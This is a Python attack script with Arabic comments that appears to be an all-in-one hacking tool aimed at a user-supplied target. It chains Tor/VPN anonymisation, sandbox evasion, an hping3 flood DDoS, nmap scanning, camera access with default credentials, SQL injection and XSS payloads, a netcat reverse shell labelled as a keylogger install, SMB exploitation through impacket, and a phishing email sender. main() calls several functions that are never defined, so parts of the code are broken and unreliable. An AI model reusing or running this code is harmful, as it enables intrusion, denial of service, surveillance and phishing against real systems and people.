import socket
import threading
import os
import time
import requests
import subprocess
import base64
from Crypto.Cipher import AES
import random
import string
import logging
import sqlite3
import socks
import ssl
import sys
import platform
import urllib.request
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import argparse
from impacket import smb
import json
import re
import hashlib
import nmap
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import pyautogui
import pyaudio
import wave
import shutil
import cv2
from onvif import ONVIFCamera
from scapy.all import ARP, Ether, srp
import pdfkit
import networkx as nx
import matplotlib.pyplot as plt

# ===================== إعداد السجل =====================
logging.basicConfig(filename='spyeye_full_attack_log.txt', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# ===================== إعداد VPN و Tor =====================
def use_tor_and_vpn():
    try:
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        subprocess.run("openvpn --config myconfig.ovpn", shell=True)
        subprocess.run("openvpn --config another_vpn_config.ovpn", shell=True)
        logging.info("[INFO] VPN and TOR setup completed.")
    except Exception as e:
        logging.error(f"[ERROR] VPN or TOR setup failed: {e}")

# ===================== تشفير البيانات =====================
def generate_aes_key():
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive(password.encode())

def encrypt_data(data, key):
    try:
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return cipher.nonce + tag + ciphertext
    except Exception as e:
        logging.error(f"[ERROR] Data encryption failed: {e}")
        return None

# ===================== تشويش الحركة =====================
def obfuscated_http_request(target_ip, target_port):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Authorization": "Bearer " + base64.b64encode(b"FakeTokenForRequest").decode(),
            "X-Forwarded-For": target_ip,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        }
        request_data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n" + "\r\n".join([f"{key}: {value}" for key, value in headers.items()])
        encrypted_message = base64.b64encode(request_data.encode())
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(encrypted_message)
            logging.info(f"[INFO] Sent obfuscated HTTPS request to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"[ERROR] Obfuscated request failed: {e}")

# ===================== كشف بيئة الاختبار (Sandbox) =====================
def detect_sandbox():
    try:
        if os.path.exists("/proc/self/status"):
            with open("/proc/self/status", "r") as f:
                content = f.read()
                if "TracerPid" in content:
                    print("[INFO] Detected sandbox environment")
                    exit(1)
    except Exception as e:
        logging.error(f"[ERROR] Sandbox detection failed: {e}")

# ===================== هجوم DDoS =====================
def ddos_attack(target_ip):
    try:
        # استخدام hping3 أو LOIC لأداء هجوم DDoS
        subprocess.run(f"hping3 --flood -p 80 {target_ip}", shell=True)
        logging.info(f"[INFO] DDoS attack initiated on {target_ip}")
    except Exception as e:
        logging.error(f"[ERROR] DDoS attack failed: {e}")

# ===================== فحص الشبكة باستخدام Nmap =====================
def nmap_scan(target):
    try:
        nmap_command = f"nmap -p- -A {target}"
        subprocess.run(nmap_command, shell=True)
        logging.info(f"[INFO] Nmap scan completed on {target}.")
    except Exception as e:
        logging.error(f"[ERROR] Nmap scan failed: {e}")

# ===================== استغلال كاميرات المراقبة =====================
def exploit_camera(ip, username, password):
    try:
        mycam = ONVIFCamera(ip, 80, username, password, "/path/to/wsdl")
        info = mycam.devicemgmt.GetDeviceInformation()
        logging.info(f"[INFO] Camera at {ip} exploited successfully! Info: {info}")
        return True
    except Exception as e:
        logging.error(f"[ERROR] Failed to exploit camera at {ip}: {e}")
    return False

# ===================== حقن SQL =====================
def sql_injection_attack(target_url):
    try:
        payload = "' OR 1=1 --"
        response = requests.get(target_url + payload)
        if "error" in response.text:
            logging.info(f"[INFO] SQL Injection successful on {target_url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"[ERROR] SQL Injection attack failed: {e}")

# ===================== XSS الهجوم =====================
def xss_attack(target_url):
    try:
        payload = "<script>alert('XSS')</script>"
        response = requests.get(target_url + payload)
        if "<script>" in response.text:
            logging.info(f"[INFO] XSS attack successful on {target_url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"[ERROR] XSS attack failed: {e}")

# ===================== تثبيت Keylogger =====================
def install_keylogger(target_ip):
    try:
        # أداة تجسسية مثلاً باستخدام Netcat
        command = f"nc -e /bin/bash {target_ip} 4444"
        subprocess.run(command, shell=True)
        logging.info(f"[INFO] Keylogger installed successfully on {target_ip}")
    except Exception as e:
        logging.error(f"[ERROR] Keylogger installation failed: {e}")

# ===================== استغلال ثغرات الشبكة (Exploits) =====================
def network_exploits(target_ip):
    try:
        # استغلال ثغرات SMB باستخدام impacket
        smb_exploit_command = f"python3 /path/to/impacket/smbexec.py {target_ip}"
        subprocess.run(smb_exploit_command, shell=True)
        logging.info(f"[INFO] SMB exploit successful on {target_ip}")
    except Exception as e:
        logging.error(f"[ERROR] Network exploit failed: {e}")

# ===================== هجوم التصيد (Phishing) عبر البريد الإلكتروني =====================
def phishing_attack(target_email):
    try:
        msg = MIMEMultipart()
        msg['From'] = 'attacker@example.com'
        msg['To'] = target_email
        msg['Subject'] = 'Important Update'

        body = "Click here for an important update: http://maliciouslink.com"
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP('smtp.example.com', 587)
        server.starttls()
        server.login('attacker@example.com', 'password')
        text = msg.as_string()
        server.sendmail('attacker@example.com', target_email, text)
        server.quit()
        logging.info(f"[INFO] Phishing email sent to {target_email}")
    except Exception as e:
        logging.error(f"[ERROR] Phishing attack failed: {e}")

# ===================== دالة رئيسية =====================
def main():
    target = input("Enter target IP or URL: ")

    detect_sandbox()

    if detect_sql_injection(target, "' OR 1=1"):
        logging.info("SQL Injection detected and exploited.")

    if detect_xss(target, "<script>alert('XSS')</script>"):
        logging.info("XSS vulnerability detected and exploited.")

    if detect_ssrf(target, "http://169.254.169.254/latest/meta-data"):
        logging.info("SSRF vulnerability detected and exploited.")

    exploit_camera("192.168.1.100", "admin", "password")
    
    # إضافة الهجمات الإضافية:
    ddos_attack(target)
    nmap_scan(target)
    sql_injection_attack(target)
    xss_attack(target)
    install_keylogger(target)
    network_exploits(target)
    phishing_attack("victim@example.com")

if __name__ == "__main__":
    main()
